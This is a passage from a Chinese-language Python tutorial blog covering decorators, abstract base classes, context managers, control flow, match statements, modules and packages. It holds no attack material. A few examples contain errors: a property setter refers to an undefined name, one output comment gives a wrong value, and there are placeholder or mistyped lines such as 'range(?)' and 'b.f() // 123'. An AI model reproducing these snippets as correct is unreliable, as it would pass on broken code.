class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(self.fc()) <span class="comment"># fc</span></span><br><span class="line">        <span class="built_in">print</span>(A.fc())    <span class="comment"># fc</span></span><br><span class="line">        <span class="built_in">print</span>(self.fs()) <span class="comment"># fs</span></span><br><span class="line">        <span class="built_in">print</span>(A.fs())    <span class="comment"># fs</span></span><br><span class="line">        <span class="built_in">print</span>(self.p1)   <span class="comment"># p1</span></span><br><span class="line">        <span class="built_in">print</span>(A.p1)      <span class="comment"># &lt;property object at 0x7f1d866500e0&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">fc</span>(<span class="params">cls</span>):</span><br><span class="line">        <span class="built_in">print</span>(cls.fs())  <span class="comment"># fs</span></span><br><span class="line">        <span class="built_in">print</span>(cls.p1)    <span class="comment"># &lt;property object at 0x7f1d866500e0&gt;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;fc&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">fs</span>():</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;fs&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">p1</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;p1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(A()) <span class="comment"># &lt;__main__.A object at 0x7f0bf41482b0&gt;</span></span><br></pre></td></tr></table></figure></div></div></div>

<h2 id="abstractmethod"><a href="#abstractmethod" class="headerlink" title="@abstractmethod"></a>@abstractmethod</h2><p><a href="https://docs.python.org/3/library/abc.html">abc — Abstract Base Classes</a></p>
<ul>
<li>abc模块提供了定义抽象基类的基础设施<ul>
<li>子类中必须实现 @abstractmethod 修饰的方法</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> abc <span class="keyword">import</span> ABC, ABCMeta, abstractmethod</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(metaclass=ABCMeta): <span class="comment"># 原始形式</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">ABC</span>):               <span class="comment"># 简化形式，避免metaclass造成困惑</span></span><br><span class="line"><span class="meta">    @abstractmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>(<span class="title class_ inherited__">A</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.m = <span class="number">123</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># (maybe) TypeError: Can&#x27;t instantiate abstract class B with abstract methods f</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.m</span><br><span class="line"></span><br><span class="line">b = B()</span><br><span class="line">b.f() // <span class="number">123</span></span><br></pre></td></tr></table></figure>

<h2 id="property"><a href="#property" class="headerlink" title="@property"></a>@property</h2><ul>
<li>@property是built-in函数，返回一个property对象，其有三个方法getter(),setter(),delete()；</li>
<li>@property在python中用来实现getter&amp;setter功能</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Distance</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, meter</span>):</span><br><span class="line">        self.meter = meter</span><br><span class="line"></span><br><span class="line">d = Distance(<span class="number">1.0</span>)</span><br><span class="line"><span class="built_in">print</span>(d.meter)</span><br><span class="line"><span class="comment"># prints 1.0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Distance</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, meter</span>):</span><br><span class="line">        <span class="comment"># Customer request: Distances must be stored in millimeters.</span></span><br><span class="line">        <span class="comment"># Public available internals must be changed.</span></span><br><span class="line">        <span class="comment"># This would break client code in C++.</span></span><br><span class="line">        <span class="comment"># This is why you never expose public variables in C++ or Java.</span></span><br><span class="line">        <span class="comment"># However, this is python.</span></span><br><span class="line">        self.millimeter = meter * <span class="number">1000</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># In python we have @property to the rescue.</span></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">meter</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.millimeter *<span class="number">0.001</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @meter.setter</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">meter</span>(<span class="params">self, value</span>):</span><br><span class="line">        self.millimeter = meter * <span class="number">1000</span></span><br><span class="line"></span><br><span class="line">d = Distance(<span class="number">1.0</span>)</span><br><span class="line"><span class="built_in">print</span>(d.meter)</span><br><span class="line"><span class="comment"># prints 1.0</span></span><br></pre></td></tr></table></figure>

<h2 id="contextmanager"><a href="#contextmanager" class="headerlink" title="@contextmanager"></a>@contextmanager</h2><ul>
<li>@contextmanager修饰符配合<code>yield</code>可以方便的实现<code>context managerment protol</code>，在with语句中使用自动管理外部资源;</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> contextlib <span class="keyword">import</span> contextmanager</span><br><span class="line"></span><br><span class="line"><span class="meta">@contextmanager</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_context_manager</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Entering the context...&quot;</span>)</span><br><span class="line">    <span class="keyword">yield</span> <span class="string">&quot;Hello, World!&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Leaving the context...&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> hello_context_manager() <span class="keyword">as</span> hello:</span><br><span class="line">    <span class="built_in">print</span>(hello)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Entering the context...</span><br><span class="line">Hello, World!</span><br><span class="line">Leaving the context...</span><br></pre></td></tr></table></figure>

<h1 id="语法结构"><a href="#语法结构" class="headerlink" title="语法结构"></a>语法结构</h1><h2 id="if-…-else"><a href="#if-…-else" class="headerlink" title="if … else"></a>if … else</h2><ul>
<li>python中任何对象都可以用在if或while条件中测试真假值；</li>
<li>Built-in object:<ul>
<li>False:<ul>
<li>None</li>
<li>False</li>
<li>数值为0时：<code>0/0.0/0j/Decimal(0)/...</code></li>
<li>序列或集合为空时：<code>‘’/()/[]/&#123;&#125;/set()/range(0)</code></li>
</ul>
</li>
</ul>
</li>
<li>User-defined object:<ul>
<li>默认为True</li>
<li>定义<code>__bool__()</code>后，由其返回值决定，且优先级高于<code>__len__()</code></li>
<li>定义<code>__len__()</code>后，返回0时为False，否则为True</li>
</ul>
</li>
<li>Boolean操作：<ul>
<li>x and y : 与</li>
<li>x or y  : 或</li>
<li>not x   : 非（优先级低于non-Boolean操作）</li>
</ul>
</li>
<li>Comparison操作：<ul>
<li>x is y     : true指x和y是相同的object’s identity</li>
<li>x is not y : true指x和y不是相同的object’s identity</li>
<li><code>==/!=</code> : <code>__eq__()</code></li>
<li><code>&lt;</code>  : <code>__lt__()</code></li>
<li><code>&lt;=</code> : <code>__le__()</code></li>
<li><code>&gt;</code>  : <code>__gt__()</code></li>
<li><code>&gt;=</code> : <code>__ge__()</code></li>
</ul>
</li>
</ul>
<h2 id="for-…-else"><a href="#for-…-else" class="headerlink" title="for … else"></a>for … else</h2><p><a href="https://stackoverflow.com/questions/9979970/why-does-python-use-else-after-for-and-while-loops/23748240#23748240">Why does python use ‘else’ after for and while loops?</a></p>
<ul>
<li>else片段只有循环正常结束时才会执行，break语句可以抑制else的执行；</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(?):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Too big - I&#x27;m giving up!&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Completed successfully&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt; range(6) show:</span><br><span class="line">0</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">Too big - I&#x27;m giving up!</span><br><span class="line"></span><br><span class="line">&gt; range(3) show:</span><br><span class="line">0</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">Completed successfully</span><br></pre></td></tr></table></figure>

<h2 id="with语句"><a href="#with语句" class="headerlink" title="with语句"></a>with语句</h2><p><a href="https://www.python.org/dev/peps/pep-0343/">PEP 343 – The “with” Statement</a></p>
<ul>
<li>context management protocol: <ul>
<li><code>__enter__()</code>在<code>with</code>语句进入<code>runtime context</code>时被调用</li>
<li><code>__exit__()</code>在执行器离开<code>with</code>代码块时被调用</li>
</ul>
</li>
<li>with语句多用来管理外部资源；</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span>:</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">__enter__</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Enter&quot;</span>) </span><br><span class="line">    <span class="keyword">return</span> self</span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">__exit__</span>(<span class="params">self, <span class="built_in">type</span>, value, trace</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;type: &#123;&#125; | value: &#123;&#125; | trace: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">type</span>,value,trace))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">myfunc</span>(<span class="params">msg</span>):</span><br><span class="line">  <span class="keyword">with</span> MyClass() <span class="keyword">as</span> sample:</span><br><span class="line">    <span class="built_in">print</span>(msg)</span><br><span class="line">    <span class="comment"># also works if uncomment this:</span></span><br><span class="line">    <span class="comment"># sys.exit(0) </span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">myfunc(<span class="string">&quot;Hello&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt; return version will show:</span><br><span class="line">Enter</span><br><span class="line">Hello</span><br><span class="line">type: None | value: None | trace: None</span><br><span class="line"></span><br><span class="line">&gt; exit(0) version will show:</span><br><span class="line">Enter</span><br><span class="line">Hello</span><br><span class="line">type: &lt;class &#x27;SystemExit&#x27;&gt; | value: 0 | trace: &lt;traceback object at 0x7faca83a7e00&gt;</span><br></pre></td></tr></table></figure>

<h3 id="async-with语句"><a href="#async-with语句" class="headerlink" title="async with语句"></a>async with语句</h3><ul>
<li>async context managerment:<ul>
<li>定义__aenter__() 和 <strong>aexit</strong>()</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> aiohttp</span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AsyncSession</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, url</span>):</span><br><span class="line">        self._url = url</span><br><span class="line"></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">__aenter__</span>(<span class="params">self</span>):</span><br><span class="line">        self.session = aiohttp.ClientSession()</span><br><span class="line">        response = <span class="keyword">await</span> self.session.get(self._url)</span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">__aexit__</span>(<span class="params">self, exc_type, exc_value, exc_tb</span>):</span><br><span class="line">        <span class="keyword">await</span> self.session.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> AsyncSession(url) <span class="keyword">as</span> response:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>: status -&gt; <span class="subst">&#123;response.status&#125;</span>&quot;</span>)</span><br><span class="line">        html = <span class="keyword">await</span> response.text()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>: type -&gt; <span class="subst">&#123;html[:<span class="number">17</span>].strip()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">await</span> asyncio.gather(</span><br><span class="line">        check(<span class="string">&quot;https://realpython.com&quot;</span>),</span><br><span class="line">        check(<span class="string">&quot;https://pycoders.com&quot;</span>),</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">asyncio.run(main())</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://realpython.com: status -&gt; 200</span><br><span class="line">https://realpython.com: type -&gt; &lt;!doctype html&gt;</span><br><span class="line">https://pycoders.com: status -&gt; 200</span><br><span class="line">https://pycoders.com: type -&gt; &lt;!doctype html&gt;</span><br></pre></td></tr></table></figure>

<h2 id="赋值表达式（Assignment）"><a href="#赋值表达式（Assignment）" class="headerlink" title="赋值表达式（Assignment）"></a>赋值表达式（Assignment）</h2><ul>
<li>python3.8+引入<code>:=</code>语法为变量赋值，作为larger表达式的一部分使用</li>
<li>语法形状像海象的眼睛和牙齿，因此也叫”walrus operator”</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (n := <span class="built_in">len</span>(a)) &gt; <span class="number">10</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;List is too long (<span class="subst">&#123;n&#125;</span> elements, expected &lt;= 10)&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="match语句"><a href="#match语句" class="headerlink" title="match语句"></a>match语句</h2><p><a href="https://docs.python.org/3/tutorial/controlflow.html#match-statements">controlflow-match-statements</a></p>
<ul>
<li>python3.10+支持match语句（类似于c++&#x2F;javascript中的switch语句）</li>
<li>match语句支持解包（unpacking），可用于绑定变量</li>
</ul>
<div class="tabs" id="match-statement"><ul class="nav-tabs"><li class="tab active"><a href="#match-statement-1">basic</a></li><li class="tab"><a href="#match-statement-2">unpack</a></li><li class="tab"><a href="#match-statement-3">class</a></li><li class="tab"><a href="#match-statement-4">list</a></li><li class="tab"><a href="#match-statement-5">enum</a></li></ul><div class="tab-content"><div class="tab-pane active" id="match-statement-1"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">desc</span>(<span class="params">status</span>):</span><br><span class="line">    <span class="keyword">match</span> status:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;a&quot;</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;b&quot;</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span> | <span class="number">4</span> | <span class="number">5</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;c&quot;</span></span><br><span class="line">        <span class="keyword">case</span> _:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;x&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(desc(<span class="number">5</span>), desc(<span class="number">10</span>))  <span class="comment"># c x</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="match-statement-2"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">point</span>(<span class="params">*value</span>):</span><br><span class="line">    <span class="keyword">match</span> value: <span class="comment"># value is an (x, y) tuple</span></span><br><span class="line">        <span class="keyword">case</span> (<span class="number">0</span>, <span class="number">0</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Origin&quot;</span>)</span><br><span class="line">        <span class="keyword">case</span> (<span class="number">0</span>, y):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Y=<span class="subst">&#123;y&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">case</span> (x, <span class="number">0</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;X=<span class="subst">&#123;x&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">case</span> (x, y):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;X=<span class="subst">&#123;x&#125;</span>, Y=<span class="subst">&#123;y&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">case</span> _:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;Not a point&quot;</span>)</span><br><span class="line"></span><br><span class="line">point(<span class="number">0</span>, <span class="number">2</span>)  <span class="comment"># Y=2</span></span><br><span class="line">point(<span class="number">1</span>, <span class="number">0</span>)  <span class="comment"># X=1</span></span><br><span class="line">point(<span class="number">1</span>, <span class="number">2</span>)  <span class="comment"># X=1, Y=3</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="match-statement-3"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Point</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, x, y</span>):</span><br><span class="line">        self.x, self.y = x, y</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        x = self.x <span class="keyword">if</span> <span class="number">0</span> &lt; self.x <span class="keyword">else</span> <span class="string">&#x27;_&#x27;</span></span><br><span class="line">        y = self.y <span class="keyword">if</span> <span class="number">0</span> &lt; self.y <span class="keyword">else</span> <span class="string">&#x27;_&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;(<span class="subst">&#123;x&#125;</span>, <span class="subst">&#123;y&#125;</span>)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">where_is</span>(<span class="params">point</span>):</span><br><span class="line">    <span class="keyword">match</span> point:</span><br><span class="line">        <span class="keyword">case</span> Point(x=<span class="number">0</span>, y=<span class="number">0</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;point&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">case</span> Point(x=<span class="number">0</span>, y=b):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;point&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">case</span> Point(x=a, y=<span class="number">0</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;point&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">case</span> Point(x=a, y=b) <span class="keyword">if</span> a == b:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;point&#125;</span>-if&quot;</span>)</span><br><span class="line">        <span class="keyword">case</span> Point():</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;point&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">case</span> _:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;NotPoint&quot;</span>)</span><br><span class="line"></span><br><span class="line">a = <span class="number">1</span></span><br><span class="line">b = <span class="number">2</span></span><br><span class="line">where_is(a)            <span class="comment"># NotPoint</span></span><br><span class="line">where_is(Point(a, <span class="number">0</span>))  <span class="comment"># (1, _)</span></span><br><span class="line">where_is(Point(<span class="number">0</span>, b))  <span class="comment"># (_, 2)</span></span><br><span class="line">where_is(Point(a, b))  <span class="comment"># (1, 2)</span></span><br><span class="line">where_is(Point(<span class="number">2</span>, <span class="number">2</span>))  <span class="comment"># (2, 2)-if</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="match-statement-4"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Point</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, x, y</span>):</span><br><span class="line">        self.x, self.y = x, y</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">where_is</span>(<span class="params">points</span>):</span><br><span class="line">    <span class="keyword">match</span> points:</span><br><span class="line">        <span class="keyword">case</span> []:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;points&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">case</span> [Point(x=<span class="number">0</span>, y=<span class="number">0</span>)]:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;points&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">case</span> [Point(x=a, y=<span class="number">0</span>), Point(x=<span class="number">0</span>, y=b) <span class="keyword">as</span> p2]:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;(<span class="subst">&#123;a&#125;</span>, <span class="subst">&#123;b&#125;</span>)-<span class="subst">&#123;p2.y*<span class="number">2</span>&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">case</span> [Point(x=a, y=b)]:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;(<span class="subst">&#123;a&#125;</span>, <span class="subst">&#123;b&#125;</span>)&quot;</span>)</span><br><span class="line">        <span class="keyword">case</span> _:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;NotPoints&quot;</span>)</span><br><span class="line"></span><br><span class="line">a = <span class="number">1</span></span><br><span class="line">b = <span class="number">2</span></span><br><span class="line">where_is(a)              <span class="comment"># NotPoints</span></span><br><span class="line">where_is([a])            <span class="comment"># NotPoints</span></span><br><span class="line">where_is([])             <span class="comment"># []</span></span><br><span class="line">where_is([Point(a, <span class="number">0</span>)])  <span class="comment"># (1, 0)</span></span><br><span class="line">where_is([Point(<span class="number">0</span>, b)])  <span class="comment"># (0, 2)</span></span><br><span class="line">where_is([Point(a, <span class="number">0</span>), Point(<span class="number">0</span>, b)])  <span class="comment"># (1, 2)-4</span></span><br><span class="line">where_is([Point(a, b)])  <span class="comment"># (1, 2)</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="match-statement-5"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> enum <span class="keyword">import</span> Enum</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Color</span>(<span class="title class_ inherited__">Enum</span>):</span><br><span class="line">    RED = <span class="string">&#x27;red&#x27;</span></span><br><span class="line">    GREEN = <span class="string">&#x27;green&#x27;</span></span><br><span class="line">    BLUE = <span class="string">&#x27;blue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">color_desc</span>(<span class="params">color</span>):</span><br><span class="line">    <span class="keyword">match</span> color:</span><br><span class="line">        <span class="keyword">case</span> Color.RED:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;I see red!&quot;</span>)</span><br><span class="line">        <span class="keyword">case</span> Color.GREEN:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Grass is green&quot;</span>)</span><br><span class="line">        <span class="keyword">case</span> Color.BLUE:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;I&#x27;m feeling the blues :(&quot;</span>)</span><br><span class="line"></span><br><span class="line">color_desc(Color(<span class="string">&#x27;red&#x27;</span>))    <span class="comment"># I see red!</span></span><br><span class="line">color_desc(Color(<span class="string">&#x27;green&#x27;</span>))  <span class="comment"># Grass is green</span></span><br></pre></td></tr></table></figure></div></div></div>

<h1 id="模块（module"><a href="#模块（module" class="headerlink" title="模块（module)"></a>模块（module)</h1><ul>
<li>模块对应一个xxx.py文件，通过<code>import</code>导入到其他模块，且<code>import</code>语句可以在任何位置；</li>
<li>每个模块的全局变量相互隔离，其中<code>__name__</code>变量中保存模块名称；</li>
<li><code>from xxx import *</code>导入除<code>_</code>开头的所有名称；</li>
<li>每个模块只会被解释器实例导入一次，可以通过<code>importlib.reload(xxx)</code>重新导入模块；</li>
</ul>
<h2 id="模块搜索路径"><a href="#模块搜索路径" class="headerlink" title="模块搜索路径"></a>模块搜索路径</h2><p><code>import xxx</code>的搜索过程：<br>1.首先搜索built-in模块<br>2.在<code>sys.path</code>列表中搜索xxx.py模块</p>
<ul>
<li>包含xxx.py脚本所在的目录（优先级高）</li>
<li>包含$PYTHONPATH环境变量中的目录</li>
<li>包含包的默认安装目录<code>site-package</code></li>
<li>不支持软链接路径<br>3.<code>dir(xxx)</code>函数返回一个模块中的所有名称的列表<br>4.<code>builtins</code>模块包含所有的内建函数与变量</li>
</ul>
<h2 id="模块缓存目录"><a href="#模块缓存目录" class="headerlink" title="模块缓存目录"></a>模块缓存目录</h2><p>为了加速模块载入过程，每个模块目录下会生成<code>__pycache__</code>目录，存储编译后的模块文件；</p>
<h1 id="包（package）"><a href="#包（package）" class="headerlink" title="包（package）"></a>包（package）</h1><ul>
<li>package是module的集合，当目录下有<code>__init__.py</code>文件时，python认为此目录是package</li>
<li>通过<code>import ppp/mmm</code>从包导入单个模块后，使用时要带包名<code>ppp.mmm.xxx()</code>（不推荐），因此多用<code>from ppp import mmm</code>语法</li>
<li><code>from . import echo</code>和<code>from ..ppp import echo</code>使用相对路径导入时，注意都是相对于<code>__main__</code>主模块而言的</li>
</ul>
<h2 id="init-py"><a href="#init-py" class="headerlink" title="__init__.py"></a><code>__init__.py</code></h2><ul>
<li><code>package_name/__init__.py</code>文件在<code>import package_name</code>时被调用，导入包中对外暴露的数据和接口；<ul>
<li><code>__all__</code>列表可以定义<code>import *</code>语法导入的模块列表</li>
</ul>
</li>
</ul>
<div class="tabs" id="package_init_py"><ul class="nav-tabs"><li class="tab active"><a href="#package_init_py-1">prometheus_client/__init__.py</a></li></ul><div class="tab-content"><div class="tab-pane active" id="package_init_py-1"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> (</span><br><span class="line">    metrics, metrics_core,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">__all__ = [<span class="string">&#x27;Counter&#x27;</span>, <span class="string">&#x27;Gauge&#x27;</span>, <span class="string">&#x27;Summary&#x27;</span>, <span class="string">&#x27;Histogram&#x27;</span>]</span><br><span class="line"></span><br><span class="line">Counter = metrics.Counter</span><br><span class="line">Gauge = metrics.Gauge</span><br><span class="line">Summary = metrics.Summary</span><br><span class="line">Histogram = metrics.Histogram</span><br></pre></td></tr></table></figure></div></div></div>

<h2 id="main-py"><a href="#main-py" class="headerlink" title="__main__.py"></a><code>__main__.py</code></h2><ul>
<li><code>package_name/__main__.py</code>文件在<code>python -m package_name</code>时被调用；</li>
</ul>
<div class="tabs" id="package_main_py"><ul class="nav-tabs"><li class="tab active"><a href="#package_main_py-1">pytest/__main__.py</a></li></ul><div class="tab-content"><div class="tab-pane active" id="package_main_py-1"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;The pytest entry point.&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> pytest</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">raise</span> SystemExit(pytest.console_main())</span><br></pre></td></tr></table></figure></div></div></div>

<h2 id="pip工具"><a href="#pip工具" class="headerlink" title="pip工具"></a>pip工具</h2><h3 id="pyproject-toml"><a href="#pyproject-toml" class="headerlink" title="pyproject.toml"></a><code>pyproject.toml</code></h3><ul>
<li><code>package_name/pyproject.toml</code>文件包含构建包时系统要求，被pip程序使用。</li>
</ul>
<h1 id="异常（Exception"><a href="#异常（Exception" class="headerlink" title="异常（Exception)"></a>异常（Exception)</h1><ul>
<li>未捕获的异常导致程序终止</li>
<li>except语句中基类异常可以匹配派生异常</li>
<li>except语句中异常名后面可以通过<code>as</code>指定绑定到异常实例的变量名</li>
</ul>
